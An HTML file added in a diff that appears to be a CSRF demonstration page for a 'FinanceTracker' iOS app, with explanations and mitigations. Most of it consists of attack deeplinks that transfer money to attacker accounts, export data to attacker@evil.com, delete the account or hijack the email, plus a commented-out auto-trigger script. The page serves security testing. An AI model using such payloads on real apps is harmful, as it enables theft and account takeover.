@@ -1,0 +1,168 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CSRF Attack Demo - FinanceTracker iOS App</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 20px;
+            background-color: #f5f5f5;
+        }
+        .container {
+            background: white;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        h1 {
+            color: #333;
+            text-align: center;
+        }
+        .attack-button {
+            display: block;
+            width: 100%;
+            padding: 15px;
+            margin: 10px 0;
+            background: #ff4444;
+            color: white;
+            text-decoration: none;
+            border-radius: 5px;
+            text-align: center;
+            font-weight: bold;
+            border: none;
+            cursor: pointer;
+            font-size: 16px;
+        }
+        .attack-button:hover {
+            background: #cc3333;
+        }
+        .info {
+            background: #e8f4fd;
+            padding: 15px;
+            border-left: 4px solid #2196F3;
+            margin: 20px 0;
+        }
+        .warning {
+            background: #fff3cd;
+            padding: 15px;
+            border-left: 4px solid #ffc107;
+            margin: 20px 0;
+        }
+        .payload-info {
+            background: #f8f9fa;
+            padding: 10px;
+            border-radius: 4px;
+            font-family: monospace;
+            font-size: 14px;
+            margin: 10px 0;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🔴 CSRF Attack Demo</h1>
+        <h2>FinanceTracker iOS App Vulnerability Test</h2>
+        
+        <div class="warning">
+            <strong>⚠️ Warning:</strong> This is a security demonstration. These attacks will perform actual operations on the FinanceTracker app if clicked.
+        </div>
+        
+        <div class="info">
+            <strong>📋 Instructions:</strong>
+            <ol>
+                <li>Make sure the FinanceTracker iOS app is installed and running in the simulator</li>
+                <li>Click any attack button below to execute a CSRF attack via deeplink</li>
+                <li>The app will process the malicious request without user consent</li>
+            </ol>
+        </div>
+
+        <h3>💰 Financial Attacks</h3>
+        <a href="financetracker://transaction?amount=1000&description=CSRF_ATTACK_TRANSFER&recipient=AttackerAccount123" class="attack-button">
+            Transfer $1000 to Attacker Account
+        </a>
+        <div class="payload-info">
+            Payload: financetracker://transaction?amount=1000&description=CSRF_ATTACK_TRANSFER&recipient=AttackerAccount123
+        </div>
+
+        <a href="financetracker://transaction?amount=5000&description=Emergency_Payment&recipient=HackerWallet" class="attack-button">
+            Transfer $5000 - "Emergency Payment"
+        </a>
+        <div class="payload-info">
+            Payload: financetracker://transaction?amount=5000&description=Emergency_Payment&recipient=HackerWallet
+        </div>
+
+        <h3>👥 Social Engineering Attacks</h3>
+        <a href="financetracker://social?action=share_data&platform=malicious-site.com&data=all" class="attack-button">
+            Share All Data to Malicious Site
+        </a>
+        <div class="payload-info">
+            Payload: financetracker://social?action=share_data&platform=malicious-site.com&data=all
+        </div>
+
+        <h3>⚙️ Settings Attacks</h3>
+        <a href="financetracker://settings?action=delete_account&confirm=true" class="attack-button">
+            Delete User Account
+        </a>
+        <div class="payload-info">
+            Payload: financetracker://settings?action=delete_account&confirm=true
+        </div>
+
+        <a href="financetracker://settings?action=export_data&destination=attacker@evil.com" class="attack-button">
+            Export Data to Attacker Email
+        </a>
+        <div class="payload-info">
+            Payload: financetracker://settings?action=export_data&destination=attacker@evil.com
+        </div>
+
+        <h3>📊 Investment Attacks</h3>
+        <a href="financetracker://investment?action=sell_all&target=attacker_wallet" class="attack-button">
+            Sell All Investments to Attacker Wallet
+        </a>
+        <div class="payload-info">
+            Payload: financetracker://investment?action=sell_all&target=attacker_wallet
+        </div>
+
+        <h3>👤 Profile Attacks</h3>
+        <a href="financetracker://profile?action=change_email&new_email=attacker@evil.com" class="attack-button">
+            Change Email to Attacker Address
+        </a>
+        <div class="payload-info">
+            Payload: financetracker://profile?action=change_email&new_email=attacker@evil.com
+        </div>
+
+        <div class="info">
+            <strong>🔍 What's Happening:</strong>
+            <p>Each button above triggers a deeplink that the FinanceTracker app processes automatically. This demonstrates a Cross-Site Request Forgery (CSRF) vulnerability where:</p>
+            <ul>
+                <li>The app accepts sensitive commands through URL schemes</li>
+                <li>No user confirmation or authentication is required</li>
+                <li>Malicious websites can trigger financial transactions</li>
+                <li>User data can be compromised without explicit consent</li>
+            </ul>
+        </div>
+
+        <div class="warning">
+            <strong>🛡️ Mitigation:</strong>
+            <p>To fix this vulnerability, the app should:</p>
+            <ul>
+                <li>Require user authentication for sensitive operations</li>
+                <li>Show confirmation dialogs for financial transactions</li>
+                <li>Validate the source of deeplink requests</li>
+                <li>Implement proper CSRF protection mechanisms</li>
+            </ul>
+        </div>
+    </div>
+
+    <script>
+        // Automatic attack simulation (uncomment to enable)
+        /*
+        setTimeout(function() {
+            console.log("Automatically triggering CSRF attack in 5 seconds...");
+            window.location.href = "financetracker://transaction?amount=999&description=AUTO_CSRF&recipient=AutoAttacker";
+        }, 5000);
+        */
+    </script>
+</body>
+</html>
